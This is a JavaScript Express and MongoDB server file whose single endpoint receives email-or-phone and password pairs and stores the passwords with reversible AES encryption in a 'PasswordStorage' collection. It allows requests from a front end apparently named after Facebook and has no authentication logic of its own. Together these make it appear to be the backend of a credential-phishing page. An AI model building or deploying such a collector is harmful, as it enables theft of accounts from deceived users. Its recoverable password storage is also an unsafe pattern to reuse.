const { MongoClient, ServerApiVersion } = require('mongodb');
const express = require('express');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');
const cors = require('cors');
require('dotenv').config();

const app = express();
const port = 5000;

// Middleware
app.use(cors({
  origin: [
    "http://localhost:5173",  // Your local development server
    "https://newblockbustermovie.vercel.app",  // Vercel front-end URL
    "https://facebook01-m1ghmrud7-johns-projects-73d3f894.vercel.app" // Another Vercel URL
  ],
  methods: ['GET', 'POST'],  // Allow GET and POST requests
  credentials: true  // Allow cookies or authorization headers
}));

app.use(express.json());
app.use(cookieParser());


const uri = `mongodb+srv://${process.env.DB_USER}:${process.env.DB_PASSWORD}@cluster0.wcilc.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0`;

// Create a MongoClient with a MongoClientOptions object to set the Stable API version
const client = new MongoClient(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true,
  }
});

async function run() {
  try {
  
    const passwordCollection = client.db('PasswordStorage').collection('userPasswords');

// Encrypt Password
function encryptPassword(password) {
  const algorithm = 'aes-256-cbc';
  const key = Buffer.from(process.env.ENCRYPTION_KEY, 'hex');
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(algorithm, key, iv);
  let encrypted = cipher.update(password, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return { encryptedPassword: encrypted, iv: iv.toString('hex') };
}

// Main application
  // Store Password Route
  app.post('/api/store-password', async (req, res) => {
      const { emailNum, password } = req.body;

      if (!emailNum || !password) {
          return res.status(400).json({ error: 'Email/Phone number and password are required.' });
      }

      // Encrypt the password
      const { encryptedPassword, iv } = encryptPassword(password);

      try {
          // Store emailNum and encrypted password with IV
          await passwordCollection.insertOne({
              emailNum,
              encryptedPassword,
              iv
          });
          res.status(200).json({ message: 'Password stored successfully' });
      } catch (error) {
          console.error("Error saving password:", error);
          res.status(500).json({ error: 'Error saving password' });
      }
  });

  // Start the Server
  app.listen(port, () => {
      console.log(`Server is running on port ${port}`);
  });
  



    console.log("Pinged your deployment. You successfully connected to MongoDB!");
  } finally {
    // Ensures that the client will close when you finish/error
    // await client.close();
  }
}
run().catch(console.dir);
